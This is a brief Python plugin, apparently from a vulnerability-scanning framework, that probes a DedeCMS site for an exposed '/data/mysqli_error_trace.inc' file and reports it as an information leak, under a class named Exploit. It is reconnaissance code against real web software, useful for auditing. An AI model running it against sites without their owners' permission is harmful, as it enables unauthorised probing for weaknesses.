#!/usr/bin/env python
import re
import requests

def assign(service, arg):
    if service == "dedecms":
        return True, arg

def audit(arg):
    url = arg
    req = requests.get(url + '/data/mysqli_error_trace.inc', timeout=5)
    if req.status_code == 200 and 'exit();' in req.text:
        return 'dedecms error info:' + url + '/data/mysqli_error_trace.inc'
# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('dedecms', 'http://localhost:66/dede')[1])

class Exploit(object):

    def attack(self, url):
        return audit(url)
